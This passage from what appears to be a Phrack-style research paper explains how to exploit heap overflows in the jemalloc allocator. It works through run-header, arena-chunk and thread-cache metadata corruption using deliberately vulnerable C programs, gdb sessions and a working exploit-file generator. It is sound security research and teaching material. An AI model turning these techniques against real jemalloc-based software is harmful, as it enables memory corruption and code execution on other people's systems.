+bar[499]:           0x40202f80
+
+
+We can see that jemalloc works in a FIFO way; the first region freed is the
+first returned for a subsequent allocation request. Although our example
+mainly demonstrates how to manipulate the jemalloc heap to exploit adjacent
+region corruptions, our observations can also help us to exploit
+use-after-free vulnerabilities. When our goal is to get data of our own
+choosing in the same region as a freed region about to be used, jemalloc's
+FIFO behavior can he help us place our data in a predictable way.
+
+In the above discussion we have implicitly assumed that we can make
+arbitrary allocations and deallocations; i.e. that we have available in
+our exploitation tool belt allocation and deallocation primitives for
+our target size. Depending on the vulnerable application (that relies
+on jemalloc) this may or may not be straightforward. For example, if
+our target is a media player we may be able to control allocations by
+introducing an arbitrary number of metadata tags in the input file. In
+the case of Firefox we can of course use Javascript to implement our
+heap primitives.  But that's the topic of another paper.
+
+
+----[ 3.3 - Metadata corruption
+
+The final heap corruption primitive we will focus on is the corruption of
+metadata. We will once again remind you that since jemalloc is not based
+on freelists (it uses macro-based red black trees instead), unlink and
+frontlink exploitation techniques are not usable. We will instead pay
+attention on how we can force 'malloc()' return a pointer that points
+to already initialized heap regions.
+
+
+------[ 3.3.1 - Run (arena_run_t)
+
+We have already defined what a 'run' is in section 2.1.3. We will briefly
+remind the reader that a 'run' is just a collection of memory regions of
+equal size that starts with some metadata describing it. Recall that runs
+are always aligned to a multiple of the page size (0x1000 in most real
+life applications). The run metadata obey the layout shown in [2-3].
+
+For release builds the 'magic' field will not be present (that is,
+MALLOC_DEBUG is off by default). As we have already mentioned, each
+run contains a pointer to the bin whose regions it contains. The 'bin'
+pointer is read and dereferenced from 'arena_run_t' (see [2-3]) only
+during deallocation. On deallocation the region size is unknown, thus the
+bin index cannot be computed directly, instead, jemalloc will first find
+the run the memory to be freed is located and will then dereference the
+bin pointer stored in the run's header. From function 'arena_dalloc_small':
+
+
+arena_dalloc_small(arena_t *arena, arena_chunk_t *chunk, void *ptr,
+        arena_chunk_map_t *mapelm)
+{
+    arena_run_t *run;
+    arena_bin_t *bin;
+    size_t size;
+
+    run = (arena_run_t *)(mapelm->bits & ~pagesize_mask);
+    bin = run->bin;
+    size = bin->reg_size;
+
+
+On the other hand, during the allocation process, once the appropriate run
+is located, its 'regs_mask[]' bit vector is examined in search of a free
+region. Note that the search for a free region starts at
+'regs_mask[regs_minelm]' ('regs_minlem' holds the index of the first
+'regs_mask[]' element that has nonzero bits). We will exploit this fact to
+force 'malloc()' return an already allocated region.
+
+In a heap overflow situation it is pretty common for the attacker to be
+able to overflow a memory region which is not followed by other regions
+(like the wilderness chunk in dlmalloc, but in jemalloc such regions are
+not that special). In such a situation, the attacker will most likely be
+able to overwrite the run header of the next run. Since runs hold memory
+regions of equal size, the next page aligned address will either be a
+normal page of the current run, or will contain the metadata (header) of
+the next run which will hold regions of different size (larger or smaller,
+it doesn't really matter). In the first case, overwriting adjacent regions
+of the same run is possible and thus an attacker can use the techniques
+that were previously discussed in 3.1. The latter case is the subject of
+the following paragraphs.
+
+People already familiar with heap exploitation, may recall that it is
+pretty common for an attacker to control the last heap item (region in our
+case) allocated, that is the most recently allocated region is the one
+being overflown. Because of the importance of this situation, we believe
+it is essential to have a look at how we can leverage it to gain control
+of the target process.
+
+Let's first have a look at how the in-memory model of a run looks like
+(file test-run.c):
+
+
+char *first;
+
+first = (char *)malloc(16);
+printf("first = %p\n", first);
+memset(first, 'A', 16);
+
+breakpoint();
+
+free(first);
+
+
+The test program is compiled and a debugging build of jemalloc is loaded
+to be used with gdb.
+
+
+~$ gcc -g -Wall test-run.c -o test-run
+~$ export LD_PRELOAD=/usr/src/lib/libc/libc.so.7
+~$ gdb test-run
+GNU gdb 6.1.1 [FreeBSD]
+...
+(gdb) run
+...
+first = 0x28201030
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+main () at simple.c:14
+14        free(first);
+
+
+The call to malloc() returns the address 0x28201030 which belongs to the
+run at 0x28201000.
+
+
+(gdb) print *(arena_run_t *)0x28201000
+$1 = {bin = 0x8049838, regs_minelm = 0, nfree = 252,
+  regs_mask = {4294967294}}
+(gdb) print *(arena_bin_t *)0x8049838
+$2 = {runcur = 0x28201000, runs = {...}, reg_size = 16, run_size = 4096,
+  nregs = 253, regs_mask_nelms = 8, reg0_offset = 48}
+
+
+Oki doki, run 0x28201000 services the requests for memory regions of size
+16 as indicated by the 'reg_size' value of the bin pointer stored in the
+run header (notice that run->bin->runcur == run).
+
+Now let's proceed with studying a scenario that can lead to 'malloc()'
+exploitation. For our example let's assume that the attacker controls
+a memory region 'A' which is the last in its run.
+
+
+[run #1 header][RR...RA][run #2 header][RR...]
+
+
+In the simple diagram shown above, 'R' stands for a normal region which may
+or may not be allocated while 'A' corresponds to the region that belongs to
+the attacker, i.e. it is the one that will be overflown. 'A' does not
+strictly need to be the last region of run #1. It can also be any region of
+the run. Let's explore how from a region on run #1 we can reach the
+metadata of run #2 (file test-runhdr.c, also see [2-6]):
+
+
+unsigned char code[] = "\x61\x62\x63\x64";
+
+one = malloc(0x10);
+memset(one, 0x41, 0x10);
+printf("[+] region one:\t\t0x%x: %s\n", (unsigned int)one, one);
+
+two = malloc(0x10);
+memset(two, 0x42, 0x10);
+printf("[+] region two:\t\t0x%x: %s\n", (unsigned int)two, two);
+
+three = malloc(0x20);
+memset(three, 0x43, 0x20);
+printf("[+] region three:\t0x%x: %s\n", (unsigned int)three, three);
+
+__asm__("int3");
+
+printf("[+] corrupting the metadata of region three's run\n");
+memcpy(two + 4032, code, 4);
+
+__asm__("int3");
+
+
+At the first breakpoint we can see that for size 16 the run is at
+0xb7d01000 and for size 32 the run is at 0xb7d02000:
+
+
+gdb $ r
+[Thread debugging using libthread_db enabled]
+[+] region one:     0xb7d01030: AAAAAAAAAAAAAAAA
+[+] region two:     0xb7d01040: BBBBBBBBBBBBBBBB
+[+] region three:   0xb7d02020: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+
+gdb $ print arenas[0].bins[3].runcur
+$5 = (arena_run_t *) 0xb7d01000
+gdb $ print arenas[0].bins[4].runcur
+$6 = (arena_run_t *) 0xb7d02000
+
+
+The metadata of run 0xb7d02000 are:
+
+
+gdb $ x/30x 0xb7d02000
+0xb7d02000: 0xb7fd3134  0x00000000  0x0000007e  0xfffffffe
+0xb7d02010: 0xffffffff  0xffffffff  0x7fffffff  0x00000000
+0xb7d02020: 0x43434343  0x43434343  0x43434343  0x43434343
+0xb7d02030: 0x43434343  0x43434343  0x43434343  0x43434343
+0xb7d02040: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+After the memcpy() and at the second breakpoint:
+
+
+gdb $ x/30x 0xb7d02000
+0xb7d02000: 0x64636261  0x00000000  0x0000007e  0xfffffffe
+0xb7d02010: 0xffffffff  0xffffffff  0x7fffffff  0x00000000
+0xb7d02020: 0x43434343  0x43434343  0x43434343  0x43434343
+0xb7d02030: 0x43434343  0x43434343  0x43434343  0x43434343
+0xb7d02040: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+We can see that the run's metadata and specifically the address of the
+'bin' element (see [2-3]) has been overwritten. One way or the other, the
+attacker will be able to alter the contents of run #2's header, but once
+this has happened, what's the potential of achieving code execution?
+
+A careful reader would have already thought the obvious; one can overwrite
+the 'bin' pointer to make it point to a fake bin structure of his own.
+Well, this is not a good idea because of two reasons. First, the attacker
+needs further control of the target process in order to successfully
+construct a fake bin header somewhere in memory. Secondly, and most
+importantly, as it has already been discussed, the 'bin' pointer of a
+region's run header is dereferenced only during deallocation. A careful
+study of the jemalloc source code reveals that only 'run->bin->reg0_offset'
+is actually used (somewhere in 'arena_run_reg_dalloc()'), thus, from an
+attacker's point of view, the bin pointer is not that interesting
+('reg0_offset' overwrite may cause further problems as well leading to
+crashes and a forced interrupt of our exploit).
+
+Our attack consists of the following steps. The attacker overflows
+'A' and overwrites run #2's header. Then, upon the next malloc() of
+a size equal to the size serviced by run #2, the user will get as a
+result a pointer to a memory region of the previous run (run #1 in our
+example). It is important to understand that in order for the attack to
+work, the overflown run should serve regions that belong to any of the
+available bins. Let's further examine our case (file vuln-run.c):
+
+
+char *one, *two, *three, *four, *temp;
+char offset[sizeof(size_t)];
+int i;
+
+if(argc < 2)
+{
+    printf("%s <offset>\n", argv[0]);
+    return 0;
+}
+
+/* User supplied value for 'regs_minelm'. */
+*(size_t *)&offset[0] = (size_t)atol(argv[1]);
+
+printf("Allocating a chunk of 16 bytes just for fun\n");
+one = (char *)malloc(16);
+printf("one = %p\n", one);
+
+/* All those allocations will fall inside the same run. */
+printf("Allocating first chunk of 32 bytes\n");
+two = (char *)malloc(32);
+printf("two = %p\n", two);
+
+printf("Performing more 32 byte allocations\n");
+for(i = 0; i < 10; i++)
+{
+    temp = (char *)malloc(32);
+    printf("temp = %p\n", temp);
+}
+
+/* This will allocate a new run for size 64. */
+printf("Setting up a run for the next size class\n");
+three = (char *)malloc(64);
+printf("three = %p\n", three);
+
+/* Overwrite 'regs_minelm' of the next run. */
+breakpoint();
+memcpy(two + 4064 + 4, offset, 4);
+breakpoint();
+
+printf("Next chunk should point in the previous run\n");
+four = (char *)malloc(64);
+printf("four = %p\n", four);
+
+
+vuln-run.c requires the user to supply a value to be written on
+'regs_minelm' of the next run. To achieve reliable results we have to
+somehow control the memory contents at 'regs_mask[regs_minelm]' as well.
+By taking a closer look at the layout of 'arena_run_t', we can see that by
+supplying the value -2 for 'regs_minelm', we can force
+'regs_mask[regs_minelm]' to point to 'regs_minelm' itself. That is,
+'regs_minelm[-2] = -2' :)
+
+Well, depending on the target application, other values may also be
+applicable but -2 is a safe one that does not cause further problems in the
+internals of jemalloc and avoids forced crashes.
+
+From function 'arena_run_reg_alloc':
+
+
+static inline void *
+arena_run_reg_alloc(arena_run_t *run, arena_bin_t *bin)
+{
+	void *ret;
+	unsigned i, mask, bit, regind;
+
+	...
+
+	i = run->regs_minelm;
+	mask = run->regs_mask[i]; /* [3-4] */
+	if (mask != 0) {
+		/* Usable allocation found. */
+		bit = ffs((int)mask) - 1; /* [3-5] */
+
+		regind = ((i << (SIZEOF_INT_2POW + 3)) + bit); /* [3-6] */
+		...
+		ret = (void *)(((uintptr_t)run) + bin->reg0_offset
+		    + (bin->reg_size * regind)); /* [3-7] */
+
+		...
+		return (ret);
+	}
+
+	...
+}
+
+
+Initially, 'i' gets the value of 'run->regs_minelm' which is equal to -2.
+On the assignment at [3-4], 'mask' receives the value 'regs_mask[-2]' which
+happens to be the value of 'regs_minelm', that is -2. The binary
+representation of -2 is 0xfffffffe thus 'ffs()' (man ffs(3) for those who
+haven't used 'ffs()' before) will return 2, so, 'bit' will equal 1. As if
+it wasn't fucking tiring so far, at [3-6], 'regind' is computed as
+'((0xfffffffe << 5) + 1)' which equals 0xffffffc1 or -63. Now do the maths,
+for 'reg_size' values belonging to small-medium sized regions, the formula
+at [3-7] calculates 'ret' in such a way that 'ret' receives a pointer to a
+memory region 63 chunks backwards :)
+
+Now it's time for some hands on practice:
+
+
+~$ gdb ./vuln-run
+GNU gdb 6.1.1 [FreeBSD]
+...
+(gdb) run -2
+Starting program: vuln-run -2
+Allocating a chunk of 16 bytes just for fun
+one = 0x28202030
+Allocating first chunk of 32 bytes
+two = 0x28203020
+Performing more 32 byte allocations
+...
+temp = 0x28203080
+...
+Setting up a run for the next size class
+three = 0x28204040
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+main (argc=Error accessing memory address 0x0: Bad address.
+) at vuln-run.c:35
+35        memcpy(two + 4064 + 4, offset, 4);
+(gdb) c
+Continuing.
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+main (argc=Error accessing memory address 0x0: Bad address.
+) at vuln-run.c:38
+38        printf("Next chunk should point in the previous run\n");
+(gdb) c
+Continuing.
+Next chunk should point in the previous run
+four = 0x28203080
+
+Program exited normally.
+(gdb) q
+
+
+Notice how the memory region numbered 'four' (64 bytes) points exactly
+where the chunk named 'temp' (32 bytes) starts. Voila :)
+
+
+------[ 3.3.2 - Chunk (arena_chunk_t)
+
+In the previous section we described the potential of achieving arbitrary
+code execution by overwriting the run header metadata. Trying to cover
+all the possibilities, we will now focus on what the attacker can do
+once she is able to corrupt the chunk header of an arena. Although
+the probability of directly affecting a nearby arena is low, a memory
+leak or the indirect control of the heap layout by continuous bin-sized
+allocations can render the technique described in this section a useful
+tool in the attacker's hand.
+
+Before continuing with our analysis, let's set the foundations of the
+test case we will cover.
+
+[[Arena #1 header][R...R][C...C]]
+
+As we have already mentioned in the previous sections, new arena chunks
+are created at will depending on whether the current arena is full
+(that is, jemalloc is unable to find a non-full run to service the
+current allocation) or whether the target application runs on multiple
+threads. Thus a good way to force the initialization of a new arena chunk
+is to continuously force the target application to perform allocations,
+preferably bin-sized ones. In the figure above, letter 'R' indicates the
+presence of memory regions that are already allocated while 'C' denotes
+regions that may be free. By continuously requesting memory regions,
+the available arena regions may be depleted forcing jemalloc to allocate
+a new arena (what is, in fact, allocated is a new chunk called an arena
+chunk, by calling 'arena_chunk_alloc()' which usually calls 'mmap()').
+
+The low level function responsible for allocating memory pages (called
+'pages_map()'), is used by 'chunk_alloc_mmap()' in a way that makes it
+possible for several distinct arenas (and any possible arena extensions)
+to be physically adjacent. So, once the attacker requests a bunch of
+new allocations, the memory layout may resemble the following figure.
+
+[[Arena #1 header][R...R][C...C]][[Arena #2 header][...]]
+
+It is now obvious that overflowing the last chunk of arena #1 will
+result in the arena chunk header of arena #2 getting overwritten. It is
+thus interesting to take a look at how one can take advantage of such
+a situation.
+
+The following code is one of those typical vulnerable-on-purpose programs
+you usually come across in Phrack articles ;) The scenario we will be
+analyzing in this section is the following: The attacker forces the
+target application to allocate a new arena by controlling the heap
+allocations. She then triggers the overflow in the last region of the
+previous arena (the region that physically borders the new arena) thus
+corrupting the chunk header metadata (see [2-5] on the diagram). When the
+application calls 'free()' on any region of the newly allocated arena,
+the jemalloc housekeeping information is altered. On the next call to
+'malloc()', the allocator will return a region that points to already
+allocated space of (preferably) the previous arena. Take your time
+to carefully study the following snippet since it is essential for
+understanding this attack (full code in vuln-chunk.c):
+
+
+char *base1, *base2;
+char *p1, *p2, *p3, *last, *first;
+char buffer[1024];
+int fd, l;
+
+p1 = (char *)malloc(16);
+base1 = (char *)CHUNK_ADDR2BASE(p1);
+print_arena_chunk(base1);
+
+/* [3-8] */
+
+/* Simulate the fact that we somehow control heap allocations.
+ * This will consume the first chunk, and will force jemalloc
+ * to allocate a new chunk for this arena.
+ */
+last = NULL;
+
+while((base2 = (char *)CHUNK_ADDR2BASE((first = malloc(16)))) == base1)
+    last = first;
+
+print_arena_chunk(base2);
+
+/* [3-9] */
+
+/* Allocate one more region right after the first region of the
+ * new chunk. This is done for demonstration purposes only.
+ */
+p2 = malloc(16);
+
+/* This is how the chunks look like at this point:
+ *
+ *   [HAAAA....L][HFPUUUU....U]
+ *
+ * H: Chunk header
+ * A: Allocated regions
+ * L: The chunk pointed to by 'last'
+ * F: The chunk pointed to by 'first'
+ * P: The chunk pointed to by 'p2'
+ * U: Unallocated space
+ */
+fprintf(stderr, "base1: %p vs. base2: %p (+%d)\n",
+    base1, base2, (ptrdiff_t)(base2 - base1));
+
+fprintf(stderr, "p1: %p vs. p2: %p (+%d)\n",
+    p1, p2, (ptrdiff_t)(p2 - p1));
+
+/* [3-10] */
+
+if(argc > 1) {
+    if((fd = open(argv[1], O_RDONLY)) > 0) {
+        /* Read the contents of the given file. We assume this file
+         * contains the exploitation vector.
+         */
+        memset(buffer, 0, sizeof(buffer));
+        l = read(fd, buffer, sizeof(buffer));
+        close(fd);
+
+        /* Copy data in the last chunk of the previous arena chunk. */
+        fprintf(stderr, "Read %d bytes\n", l);
+        memcpy(last, buffer, l);
+    }
+}
+
+/* [3-11] */
+
+/* Trigger the bug by free()ing any chunk in the new arena. We
+ * can achieve the same results by deallocating 'first'.
+ */
+free(p2);
+print_region(first, 16);
+
+/* [3-12] */
+
+/* Now 'p3' will point to an already allocated region (in this
+ * example, 'p3' will overwhelm 'first').
+ */
+p3 = malloc(4096);
+
+/* [3-13] */
+
+fprintf(stderr, "p3 = %p\n", p3);
+memset(p3, 'A', 4096);
+
+/* 'A's should appear in 'first' which was previously zeroed. */
+print_region(first, 16);
+return 0;
+
+
+Before going further, the reader is advised to read the comments and the
+code above very carefully. You can safely ignore 'print_arena_chunk()'
+and 'print_region()', they are defined in the file lib.h found in the code
+archive and are used for debugging purposes only. The snippet is actually
+split in 6 parts which can be distinguished by their corresponding '[3-x]'
+tags. Briefly, in part [3-8], the vulnerable program performs a number
+of allocations in order to fill up the available space served by the
+first arena. This emulates the fact that an attacker somehow controls
+the order of allocations and deallocations on the target, a fair and
+very common prerequisite. Additionally, the last call to 'malloc()'
+(the one before the while loop breaks) forces jemalloc to allocate a new
+arena chunk and return the first available memory region. Part [3-9],
+performs one more allocation, one that will lie next to the first (that
+is the second region of the new arena). This final allocation is there
+for demonstration purposes only (check the comments for more details).
+
+Part [3-10] is where the actual overflow takes place and part [3-11]
+calls 'free()' on one of the regions of the newly allocated arena. Before
+explaining the rest of the vulnerable code, let's see what's going on when
+'free()' gets called on a memory region.
+
+
+void
+free(void *ptr)
+{
+  ...
+  if (ptr != NULL) {
+    ...
+    idalloc(ptr);
+  }
+}
+
+static inline void
+idalloc(void *ptr)
+{
+  ...
+  chunk = (arena_chunk_t *)CHUNK_ADDR2BASE(ptr); /* [3-14] */
+  if (chunk != ptr)
+    arena_dalloc(chunk->arena, chunk, ptr); /* [3-15] */
+  else
+    huge_dalloc(ptr);
+}
+
+
+The 'CHUNK_ADDR2BASE()' macro at [3-14] returns the pointer to the chunk
+that the given memory region belongs to. In fact, what it does is just
+a simple pointer trick to get the first address before 'ptr' that is
+aligned to a multiple of a chunk size (1 or 2 MB by default, depending
+on the jemalloc flavor used). If this chunk does not belong to a, so
+called, huge allocation, then the allocator knows that it definitely
+belongs to an arena. As previously stated, an arena chunk begins with
+a special header, called 'arena_chunk_t', which, as expected, contains
+a pointer to the arena that this chunk is part of.
+
+Now recall that in part [3-10] of the vulnerable snippet presented
+above, the attacker is able to overwrite the first few bytes of the next
+arena chunk. Consequently, the 'chunk->arena' pointer that points to
+the arena is under the attacker's control. From now on, the reader may
+safely assume that all functions called by 'arena_dalloc()' at [3-15]
+may receive an arbitrary value for the arena pointer:
+
+
+static inline void
+arena_dalloc(arena_t *arena, arena_chunk_t *chunk, void *ptr)
+{
+  size_t pageind;
+  arena_chunk_map_t *mapelm;
+  ...
+
+  pageind = (((uintptr_t)ptr - (uintptr_t)chunk) >> PAGE_SHIFT);
+  mapelm = &chunk->map[pageind];
+  ...
+
+  if ((mapelm->bits & CHUNK_MAP_LARGE) == 0) {
+    /* Small allocation. */
+    malloc_spin_lock(&arena->lock);
+    arena_dalloc_small(arena, chunk, ptr, mapelm);  /* [3-16] */
+    malloc_spin_unlock(&arena->lock);
+  }
+  else
+    arena_dalloc_large(arena, chunk, ptr); /* [3-17] */
+}
+
+
+Entering 'arena_dalloc()', one can see that the 'arena' pointer
+is not used a lot, it's just passed to 'arena_dalloc_small()'
+or 'arena_dalloc_large()' depending on the size class of the
+memory region being deallocated. It is interesting to note that the
+aforementioned size class is determined by inspecting 'mapelm->bits'
+which, hopefully, is under the influence of the attacker. Following
+the path taken by 'arena_dalloc_small()' results in many complications
+that will most probably ruin our attack (hint for the interested
+reader - pointer arithmetics performed by 'arena_run_reg_dalloc()'
+are kinda dangerous). For this purpose, we choose to follow function
+'arena_dalloc_large()':
+
+
+static void
+arena_dalloc_large(arena_t *arena, arena_chunk_t *chunk, void *ptr)
+{
+  malloc_spin_lock(&arena->lock);
+  ...
+
+  size_t pageind = ((uintptr_t)ptr - (uintptr_t)chunk) >>
+    PAGE_SHIFT; /* [3-18] */
+  size_t size = chunk->map[pageind].bits & ~PAGE_MASK; /* [3-19] */
+
+  ...
+  arena_run_dalloc(arena, (arena_run_t *)ptr, true);
+  malloc_spin_unlock(&arena->lock);
+}
+
+
+There are two important things to notice in the snippet above. The first
+thing to note is the way 'pageind' is calculated. Variable 'ptr' points
+to the start of the memory region to be free()'ed while 'chunk' is the
+address of the corresponding arena chunk. For a chunk that starts at
+e.g. 0x28200000, the first region to be given out to the user may start
+at 0x28201030 mainly because of the overhead involving the metadata of
+chunk, arena and run headers as well as their bitmaps. A careful reader
+may notice that 0x28201030 is more than a page far from the start
+of the chunk, so, 'pageind' is larger or equal to 1. It is for this
+purpose that we are mostly interested in overwriting 'chunk->map[1]'
+and not 'chunk->map[0]'. The second thing to catch our attention is
+the fact that, at [3-19], 'size' is calculated directly from the 'bits'
+element of the overwritten bitmap. This size is later converted to the
+number of pages comprising it, so, the attacker can directly affect the
+number of pages to be marked as free. Let's see 'arena_run_dalloc':
+
+
+static void
+arena_run_dalloc(arena_t *arena, arena_run_t *run, bool dirty)
+{
+  arena_chunk_t *chunk;
+  size_t size, run_ind, run_pages;
+
+  chunk = (arena_chunk_t *)CHUNK_ADDR2BASE(run);
+  run_ind = (size_t)(((uintptr_t)run - (uintptr_t)chunk)
+      >> PAGE_SHIFT);
+  ...
+
+  if ((chunk->map[run_ind].bits & CHUNK_MAP_LARGE) != 0)
+    size = chunk->map[run_ind].bits & ~PAGE_MASK;
+  else
+    ...
+  run_pages = (size >> PAGE_SHIFT); /* [3-20] */
+
+  /* Mark pages as unallocated in the chunk map. */
+  if (dirty) {
+    size_t i;
+
+    for (i = 0; i < run_pages; i++) {
+      ...
+      /* [3-21] */
+      chunk->map[run_ind + i].bits = CHUNK_MAP_DIRTY;
+    }
+
+    ...
+    chunk->ndirty += run_pages;
+    arena->ndirty += run_pages;
+  }
+  else {
+    ...
+  }
+  chunk->map[run_ind].bits = size | (chunk->map[run_ind].bits &
+      PAGE_MASK);
+  chunk->map[run_ind+run_pages-1].bits = size |
+      (chunk->map[run_ind+run_pages-1].bits & PAGE_MASK);
+
+
+  /* Page coalescing code - Not relevant for _this_ example. */
+  ...
+
+  /* Insert into runs_avail, now that coalescing is complete. */
+  /* [3-22] */
+  arena_avail_tree_insert(&arena->runs_avail, &chunk->map[run_ind]);
+
+  ...
+}
+
+
+Continuing with our analysis, one can see that at [3-20] the same
+size that was calculated in 'arena_dalloc_large()' is now converted
+to a number of pages and then all 'map[]' elements that correspond to
+these pages are marked as dirty (notice that 'dirty' argument given
+to 'arena_run_dalloc()' by 'arena_dalloc_large()' is always set to
+true). The rest of the 'arena_run_dalloc()' code, which is not shown
+here, is responsible for forward and backward coalescing of dirty
+pages. Although not directly relevant for our demonstration, it's
+something that an attacker should keep in mind while developing a real
+life reliable exploit.
+
+Last but not least, it's interesting to note that, since the attacker
+controls the 'arena' pointer, the map elements that correspond to the
+freed pages are inserted in the given arena's red black tree. This can be
+seen at [3-22] where 'arena_avail_tree_insert()' is actually called. One
+may think that since red-black trees are involved in jemalloc, she can
+abuse their pointer arithmetics to achieve a '4bytes anywhere' write
+primitive. We urge all interested readers to have a look at rb.h, the
+file that contains the macro-based red black tree implementation used
+by jemalloc (WARNING: don't try this while sober).
+
+Summing up, our attack algorithm consists of the following steps:
+
+1) Force the target application to perform a number of allocations until a
+new arena is eventually allocated or until a neighboring arena is reached
+(call it arena B). This is mostly meaningful for our demonstration codes,
+since, in real life applications chances are that more than one chunks
+and/or arenas will be already available during the exploitation process.
+
+2) Overwrite the 'arena' pointer of arena B's chunk and make it point
+to an already existing arena. The address of the very first arena of
+a process (call it arena A) is always fixed since it's declared as
+static. This will prevent the allocator from accessing a bad address
+and eventually segfaulting.
+
+3) Force or let the target application free() any chunk that belongs to
+arena B. We can deallocate any number of pages as long as they are marked
+as allocated in the jemalloc metadata. Trying to free an unallocated page
+will result in the red-black tree implementation of jemalloc entering
+an endless loop or, rarely, segfaulting.
+
+4) The next allocation to be served by arena B, will return a pointer
+somewhere within the region that was erroneously free()'ed in step 3.
+
+The exploit code for the vulnerable program presented in this section
+can be seen below. It was coded on an x86 FreeBSD-8.2-RELEASE system, so
+the offsets of the metadata may vary for your platform. Given the address
+of an existing arena (arena A of step 2), it creates a file that contains
+the exploitation vector. This file should be passed as argument to the
+vulnerable target (full code in file exploit-chunk.c):
+
+
+char buffer[1024], *p;
+int fd;
+
+if(argc != 2) {
+    fprintf(stderr, "%s <arena>\n", argv[0]);
+    return 0;
+}
+
+memset(buffer, 0, sizeof(buffer));
+
+p = buffer;
+strncpy(p, "1234567890123456", 16);
+p += 16;
+
+/* Arena address. */
+*(size_t *)p = (size_t)strtoul(argv[1], NULL, 16);
+p += sizeof(size_t);
+
+/* Skip over rbtree metadata and 'chunk->map[0]'. */
+strncpy(p,
+    "AAAA" "AAAA" "CCCC"
+    "AAAA" "AAAA" "AAAA" "GGGG" "HHHH" , 32);
+
+p += 32;
+
+*(size_t *)p = 0x00001002;
+/*                      ^ CHUNK_MAP_LARGE                 */
+/*                   ^ Number of pages to free (1 is ok). */
+p += sizeof(size_t);
+
+fd = open("exploit2.v", O_WRONLY | O_TRUNC | O_CREAT, 0700);
+write(fd, buffer, (p - (char *)buffer));
+close(fd);
+return 0;
+
+
+It is now time for some action. First, let's compile and run the vulnerable
+code.
+
+
+$ ./vuln-chunk
+# Chunk 0x28200000 belongs to arena 0x8049d98
+# Chunk 0x28300000 belongs to arena 0x8049d98
+...
+# Region at 0x28301030
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
+p3 = 0x28302000
+# Region at 0x28301030
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
+
+
+The output is what one expects it to be. First, the vulnerable code forces
+the allocator to initialize a new chunk (0x28300000) and then requests
+a memory region which is given the address 0x28301030. The next call to
+'malloc()' returns 0x28302000. So far so good. Let's feed our target
+with the exploitation vector and see what happens.
+
+$ ./exploit-chunk 0x8049d98
+$ ./vuln-chunk exploit2.v
+# Chunk 0x28200000 belongs to arena 0x8049d98
+# Chunk 0x28300000 belongs to arena 0x8049d98
+...
+Read 56 bytes
+# Region at 0x28301030
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00         ................
+p3 = 0x28301000
+# Region at 0x28301030
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41         AAAAAAAAAAAAAAAA
+
+
+As you can see the second call to 'malloc()' returns a new region
+'p3 = 0x28301000' which lies 0x30 bytes before 'first' (0x28301030)!
+
+Okay, so you're now probably thinking if this technique is useful. Please
+note that the demonstration code presented in the previous two sections
+was carefully coded to prepare the heap in a way that is convenient for
+the attacker. It is for this purpose that these attacks may seem obscure
+at first. On the contrary, in real life applications, heap overflows in
+jemalloc will result in one of the following three cases:
+
+1) Overwrite of an adjacent memory region.
+
+2) Overwrite of the run metadata (in case the overflown region is the
+last in a run).
+
+3) Overwrite of the arena chunk metadata (in case the overflown region
+is the last in a chunk).
+
+That said we believe we have covered most of the cases that an attacker
+may encounter. Feel free to contact us if you think we have missed
+something important.
+
+
+------[ 3.3.3 - Thread caches (tcache_t)
+
+As we have analyzed in 2.1.7, thread cache magazine 'rounds' and other
+magazine metadata are placed in normal memory regions. Assuming a 'mag_t'
+along with its void pointer array has a total size of N, one can easily
+acquire a memory region in the same run by calling 'malloc(N)'.
+
+Overflowing a memory region adjacent to a 'mag_t' can result in 'malloc()'
+returning arbitrary attacker controlled addresses. It's just a matter of
+overwriting 'nrounds' and the contents of the void pointer array to
+contain a stack address (or any other address of interest). A careful
+reader of section 2.1.7 would have probably noticed that the same result
+can be achieved by giving 'nrounds' a sufficiently large value in order to
+pivot in the stack (or any user controlled memory region). This scenario is
+pretty straightforward to exploit, so, we will have a look at the case of
+overwriting a 'mag_rack_t' instead (it's not that sophisticated either).
+
+Magazine racks are allocated by 'mag_rack_alloc()':
+
+
+mag_rack_t *
+mag_rack_create(arena_t *arena)
+{
+    ...
+    return (arena_malloc_small(arena, sizeof(mag_rack_t) +
+        (sizeof(bin_mags_t) * (nbins - 1)), true));
+}
+
+
+Now, let's calculate the size of a magazine rack:
+
+
+(gdb) print nbins
+$6 = 30
+(gdb) print sizeof(mag_rack_t) + (sizeof(bin_mags_t) * (nbins - 1))
+$24 = 240
+
+
+A size of 240 is actually serviced by the bin holding regions of 256 bytes.
+Issuing calls to 'malloc(256)' will eventually end up in a user controlled
+region physically bordering a 'mag_rack_t'. The following vulnerable code
+emulates this situation (file vuln-mag.c):
+
+
+/* The 'vulnerable' thread. */
+void *vuln_thread_runner(void *arg) {
+  char *v;
+
+  v = (char *)malloc(256);  /* [3-25] */
+  printf("[vuln] v = %p\n", v);
+  sleep(2);
+
+  if(arg)
+    strcpy(v, (char *)arg);
+  return NULL;
+}
+
+/* Other threads performing allocations. */
+void *thread_runner(void *arg) {
+  size_t self = (size_t)pthread_self();
+  char *p1, *p2;
+
+  /* Allocation performed before the magazine rack is overflown. */
+  p1 = (char *)malloc(16);
+  printf("[%u] p1 = %p\n", self, p1);
+  sleep(4);
+
+  /* Allocation performed after overflowing the rack. */
+  p2 = (char *)malloc(16);
+  printf("[%u] p2 = %p\n", self, p2);
+  sleep(4);
+  return NULL;
+}
+
+int main(int argc, char *argv[]) {
+  size_t tcount, i;
+  pthread_t *tid, vid;
+
+  if(argc != 3) {
+    printf("%s <thread_count> <buff>\n", argv[0]);
+    return 0;
+  }
+
+  /* The fake 'mag_t' structure will be placed here. */
+  printf("[*] %p\n", getenv("FAKE_MAG_T"));
+
+  tcount = atoi(argv[1]);
+  tid = (pthread_t *)alloca(tcount * sizeof(pthread_t));
+
+  pthread_create(&vid, NULL, vuln_thread_runner, argv[2]);
+  for(i = 0; i < tcount; i++)
+    pthread_create(&tid[i], NULL, thread_runner, NULL);
+
+  pthread_join(vid, NULL);
+  for(i = 0; i < tcount; i++)
+    pthread_join(tid[i], NULL);
+
+  pthread_exit(NULL);
+}
+
